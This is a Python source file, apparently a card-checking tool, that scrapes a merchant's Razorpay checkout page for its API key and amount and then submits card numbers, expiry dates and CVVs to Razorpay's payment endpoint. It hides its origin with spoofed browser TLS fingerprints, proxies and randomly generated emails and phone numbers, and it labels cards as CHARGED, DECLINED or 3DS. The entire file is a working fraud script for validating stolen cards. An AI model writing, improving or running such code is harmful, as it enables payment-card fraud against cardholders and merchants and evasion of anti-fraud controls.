import time
import re
import random
import string
import json
import asyncio
import tls_client

def get_random_string(length=10):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(length))

async def get_checkout_info(url: str, proxy: str = None) -> dict:
    """Fetches key_id, amount, currency, and merchant from a Razorpay link."""
    try:
        session = tls_client.Session(
            client_identifier="chrome_120",
            random_tls_extension_order=True
        )
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
            
        # Run synchronous request in a thread
        res = await asyncio.to_thread(session.get, url, timeout_seconds=15)
        
        if res.status_code != 200:
            return {"error": f"Failed to load URL (Status: {res.status_code})"}
            
        html = res.text
        
        # Try to find key_id
        key_id = None
        key_match = re.search(r'["\']?key_id["\']?\s*:\s*["\'](rzp_(live|test)_[^"\']+)["\']', html)
        if key_match:
            key_id = key_match.group(1)
        else:
            key_match = re.search(r'data-key=["\'](rzp_(live|test)_[^"\']+)["\']', html)
            if key_match:
                key_id = key_match.group(1)
                
        if not key_id:
            return {"error": "Could not find Razorpay Key ID on this page."}
            
        # Try to find amount and currency
        amount = 0
        currency = "INR"
        amount_match = re.search(r'["\']?amount["\']?\s*:\s*(\d+)', html)
        if amount_match:
            amount = int(amount_match.group(1)) / 100
            
        currency_match = re.search(r'["\']?currency["\']?\s*:\s*["\']([A-Z]{3})["\']', html)
        if currency_match:
            currency = currency_match.group(1)
            
        # Try to find merchant name
        merchant = "Unknown Merchant"
        name_match = re.search(r'["\']?name["\']?\s*:\s*["\']([^"\']+)["\']', html)
        if name_match:
            merchant = name_match.group(1)
            
        return {
            "key_id": key_id,
            "amount": amount,
            "currency": currency,
            "merchant": merchant,
            "url": url,
            "raw_amount": amount_match.group(1) if amount_match else 100 # Default to 1.00 if not found
        }
        
    except Exception as e:
        return {"error": f"Error fetching checkout: {str(e)}"}

async def charge_card(card: dict, checkout: dict, proxy: str = None) -> dict:
    """Attempts to charge a card via Razorpay API."""
    start_time = time.perf_counter()
    result = {
        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
        "status": "FAILED",
        "response": "",
        "time": 0.0
    }
    
    try:
        session = tls_client.Session(
            client_identifier="chrome_120",
            random_tls_extension_order=True
        )
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
            
        # Razorpay Payment Creation Endpoint
        url = "https://api.razorpay.com/v1/payments/create/ajax"
        
        email = f"{get_random_string(8)}@gmail.com"
        phone = f"98{random.randint(10000000, 99999999)}"
        
        payload = {
            "key_id": checkout["key_id"],
            "amount": checkout.get("raw_amount", "100"),
            "currency": checkout["currency"],
            "email": email,
            "contact": phone,
            "method": "card",
            "card[name]": "Cardholder Name",
            "card[number]": card['cc'],
            "card[expiry_month]": card['month'],
            "card[expiry_year]": card['year'],
            "card[cvv]": card['cvv'],
            "_": str(int(time.time() * 1000))
        }
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://api.razorpay.com",
            "Referer": checkout["url"],
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        res = await asyncio.to_thread(
            session.post, 
            url, 
            data=payload, 
            headers=headers,
            timeout_seconds=20
        )
        
        result["time"] = round(time.perf_counter() - start_time, 2)
        
        try:
            data = res.json()
        except:
            result["response"] = "Invalid response from Razorpay"
            return result
            
        if "error" in data:
            error_desc = data["error"].get("description", "Unknown error")
            result["response"] = error_desc
            
            error_desc_lower = error_desc.lower()
            if "insufficient funds" in error_desc_lower:
                result["status"] = "DECLINED" # Often considered live depending on the user, but we'll stick to DECLINED
            elif "incorrect" in error_desc_lower or "declined" in error_desc_lower:
                result["status"] = "DECLINED"
            elif "authentication" in error_desc_lower or "3d secure" in error_desc_lower:
                result["status"] = "3DS"
            else:
                result["status"] = "DECLINED"
        else:
            # Check for next action (3DS)
            if "next" in data and len(data["next"]) > 0:
                result["status"] = "3DS"
                result["response"] = "3DS Required"
            elif "razorpay_payment_id" in data:
                result["status"] = "CHARGED"
                result["response"] = "Payment successful"
            else:
                result["status"] = "FAILED"
                result["response"] = "Unknown status"
                
    except Exception as e:
        result["time"] = round(time.perf_counter() - start_time, 2)
        result["response"] = str(e)[:50]
        
    return result
